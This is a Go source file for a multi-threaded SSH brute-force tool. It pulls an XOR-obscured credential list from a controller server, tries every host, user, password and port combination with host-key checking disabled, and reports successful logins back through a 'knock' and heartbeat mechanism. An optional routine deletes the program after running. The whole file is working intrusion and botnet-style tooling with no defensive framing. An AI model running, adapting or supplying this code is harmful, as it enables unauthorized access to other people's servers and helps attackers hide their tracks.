package bf

import (
	"bytes"
	"encoding/csv"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"sort"
	"strconv"
	"sync"
	knock "test/KNOCK"
	vars "test/VARS"
	"time"

	"golang.org/x/crypto/ssh"
)

var allC vars.AllConnections
var b bytes.Buffer
var wg sync.WaitGroup
var DaC []vars.DelaConnection
var serCon vars.Connection

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func Bf(conf vars.Config) {

	flag.Parse()

	if conf.Flags.BrFile == "" || conf.Server.Host == "" || conf.Server.Port == "" || conf.Server.User == "" || conf.Server.Pass == "" {
		return
	}

	vars.BrFileHomeDir = filepath.Join("/tmp", RandomString(10))
	serCon.Host = conf.Server.Host
	serCon.Port = conf.Server.Port
	serCon.Username = conf.Server.User // []Do Something TODO
	serCon.Password = conf.Server.Pass

	msgSess := make(chan vars.Connection)
	msgErr := make(chan vars.Connection)
	go checkSession(msgSess, msgErr)
	GetFileFromServer(conf.Flags.BrFile)
	ReadCsv(msgSess, msgErr, conf)
}

func checkSession(msgSess, msgErr chan vars.Connection) {
	for {
		select {
		case ses := <-msgSess:
			c := vars.DelaConnection{
				Single: false,
				Conn:   ses,
			}
			DaC = append(DaC, c)
		case SingleDel := <-msgErr:
			c := vars.DelaConnection{
				Single: true,
				Conn:   SingleDel,
			}
			DaC = append(DaC, c)
		case <-time.After(100 * time.Millisecond):
			continue
		}
	}

}

func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {

	file, err := os.ReadFile(vars.BrFileHomeDir)
	if err != nil {
		fmt.Println(err)
	}
	for i, j := range file {
		file[i] = j ^ 'P'
	}
	byteReader := bytes.NewReader(file)
	reader := csv.NewReader(byteReader)
	records, err := reader.ReadAll()
	if err != nil {
		fmt.Println("Error reading records")
	}

	Ports := []string{}
	Hosts := []string{}
	Users := []string{}
	Passes := []string{}
	c := vars.Connection{}
	if conf.Flags.Combo {
		for i, eachrecord := range records[1:] {
			c.Host = eachrecord[0]
			c.Username = eachrecord[1]
			c.Password = eachrecord[2]
			c.Port = eachrecord[3]
			c.Place = strconv.Itoa(i+1) + "!"
			allC.Conn = append(allC.Conn, c)
		}

	} else {
		for _, eachrecord := range records[1:] {
			// for _, j := range eachrecord {
			if eachrecord[0] != "" {
				Hosts = append(Hosts, eachrecord[0])
			}
			if eachrecord[1] != "" {
				Users = append(Users, eachrecord[1])
			}
			if eachrecord[2] != "" {
				Passes = append(Passes, eachrecord[2])
			}
			if eachrecord[3] != "" {
				Ports = append(Ports, eachrecord[3])
			}
		}

		for a, h := range Hosts {
			for b, u := range Users {
				for cc, p := range Passes {
					for d, po := range Ports {
						c.Place = strconv.Itoa(a+1) + "-" + strconv.Itoa(b+1) + "-" + strconv.Itoa(cc+1) + "-" + strconv.Itoa(d+1) + "!"
						c.Host = h
						c.Username = u
						c.Password = p
						c.Port = po
						c.IsUsed = false
						allC.Conn = append(allC.Conn, c)
					}
				}
			}
		}
	}
	StartBruteForce(&allC, msgSess, msgErr, conf)
	// SendFileToServer(finalSessionsFound, conf)
	if conf.Flags.Destr {
		SelfDel()
	}
}

func SelfDel() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("Error changing file permissions: %v\n", err)
		return
	}
	fmt.Println(os.Args[0])
	if runtime.GOOS == "linux" {
		os.Remove(vars.BrFileHomeDir)
		cmd := exec.Command("bash", "-c", "rm "+exePath)
		cmd.Start()
	} else if runtime.GOOS == "windows" {
		os.Remove(vars.BrFileHomeDir)
		cmd := exec.Command("cmd.exe", "/c", "del "+exePath)
		cmd.Start()
	}
}

func SendFileToServer(finalSessionsFound []vars.Connection, conf vars.Config) {

	session, _, err := CreateConn(serCon)
	if err != nil {
		fmt.Println("error")
	}
	session.Stdout = &b
	stringToWrite := ""
	for _, j := range finalSessionsFound {

		x := fmt.Sprintf("HOST : %s Pass : %s  Usename : %s Port : %s \n", j.Host, j.Password, j.Username, j.Port)

		stringToWrite = stringToWrite + x

	}

	// fmt.Println(stringToWrite, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
	// runCommand := fmt.Sprintf("%s  -e \"%s\" >> response.txt", "echo", stringToWrite)

	// erra := session.Run(runCommand)
	// if erra != nil {
	// fmt.Println("error")
	// }
	b.Reset()
}

func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, conf vars.Config) {
	// foundSessions := []vars.Connection{}
	for len(allConn.Conn) != 0 {
		for i := 1; i <= conf.Flags.Threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				randomConn := rand.Intn(len(allConn.Conn))
				if !allConn.Conn[randomConn].IsUsed {
					allConn.Conn[randomConn].IsUsed = true
					session, conn, err := CreateConn(allConn.Conn[randomConn])
					if err != nil {
						msgErr <- conn
					} else if session != nil {
						msgSess <- conn
						session.Close()
						knock.SendKnock(conn.Place, conf)
					}
				}
			}()
			time.Sleep(100 * time.Millisecond)
		}
		wg.Wait()
		fmt.Println("END NEXT 3")
		// knock.SendKnock("")
		delay := 500 * time.Millisecond
		knock.SendIAmAlive(conf.Server.Host, conf.Flags.KnockAlive, delay)
		ClearList(allConn)
	}
	// return foundSessions

}

func ClearList(allConn *vars.AllConnections) {
	PlacesToDel := []int{}
	for _, j := range DaC {
		if j.Single {
			for i, k := range allConn.Conn {
				if j.Conn.Host == k.Host && j.Conn.Password == k.Password && j.Conn.Username == k.Username && j.Conn.Port == k.Port {
					PlacesToDel = append(PlacesToDel, i)
				}
			}
		} else if !j.Single {
			for i, k := range allC.Conn {
				if j.Conn.Host == k.Host {
					PlacesToDel = append(PlacesToDel, i)
				}
			}
		}

	}
	PlacesToDel = removeDuplicates(PlacesToDel)
	sort.Sort(sort.Reverse(sort.IntSlice(PlacesToDel)))
	for _, j := range PlacesToDel {
		allConn.Conn = slices.Delete(allConn.Conn, j, j+1)
	}

	DaC = DaC[:0]
}

func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
	config := &ssh.ClientConfig{
		User: c.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	hostPort := fmt.Sprintf("%s:%s", c.Host, c.Port)
	client, err := ssh.Dial("tcp", hostPort, config)

	if err != nil {

		return nil, c, err
	}

	session, err := client.NewSession()
	if err != nil {
		return nil, c, err
	}
	return session, c, nil
}

func GetFileFromServer(BrFile string) {
	fmt.Println(serCon, "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
	session, _, err := CreateConn(serCon)
	if err != nil {
		fmt.Println("error")
	}

	fmt.Println(b, "AAAAAAAAAAAAAAAAAA", session)
	session.Stdout = &b
	erra := session.Run("cat " + BrFile)
	if erra != nil {
		fmt.Println("error", erra)
	}
	WriteFile(b)
	b.Reset()

}

func WriteFile(b bytes.Buffer) {
	for i, j := range b.Bytes() {
		b.Bytes()[i] = j ^ 'P'
	}
	err := os.WriteFile(vars.BrFileHomeDir, b.Bytes(), 0777)
	if err != nil {
		fmt.Println(err)
	}
}

func removeDuplicates(nums []int) []int {
	encountered := map[int]bool{} // Track encountered integers
	result := []int{}             // Slice to store unique integers

	// Iterate over the input slice
	for _, v := range nums {
		if !encountered[v] {
			encountered[v] = true
			result = append(result, v)
		}
	}

	return result
}

func RandomString(length int) string {
	seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
